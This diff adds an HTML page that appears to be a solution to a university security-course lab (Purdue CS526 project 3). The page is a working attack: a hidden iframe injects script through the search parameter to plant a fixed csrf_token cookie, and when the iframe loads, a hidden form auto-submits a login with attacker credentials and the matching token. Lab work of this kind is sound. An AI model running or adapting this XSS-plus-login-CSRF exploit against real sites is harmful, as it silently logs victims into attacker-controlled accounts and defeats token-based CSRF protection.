@@ -1,0 +1,34 @@
+
+<!DOCTYPE html>
+
+<html>
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+	<body>
+	<iframe style="display:none" id="setCSRFToken" name="setCSRFToken" src="http://cs526-s18.cs.purdue.edu/project3/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3Ewindow.onload%3Dfunction()%7Bdocument.cookie%3D%22csrf_token%3D1234567890123456%22%7D%3C%2Fscript%3E" width="400px" height="400px"></iframe>
+
+
+		<iframe id = "frame" name="csrf1_frame" style="visibility:hidden;">
+
+		</iframe>	
+		
+		<form id="csrf1_attack" target="csrf1_frame" style="visibility:hidden;"
+			action="http://cs526-s18.cs.purdue.edu/project3/login?csrfdefense=1&xssdefense=0" 
+			method="post" class="form-inline">
+			<input type="hidden" id = "username" name="username" value="attacker">
+			<input type="hidden" id = "userpass" name="password" value="123456">
+			<input type="hidden" id = "token" name = "csrf_token" value="1234567890123456">
+			<input type="submit" value="Login">
+
+		</form>
+
+	<script>	
+
+			var the_first_iframe = document.getElementById("setCSRFToken");
+			the_first_iframe.onload = function(){
+				document.getElementById("csrf1_attack").submit();
+				}
+				</script>
+	</script>
+
+	</body>
+</html>
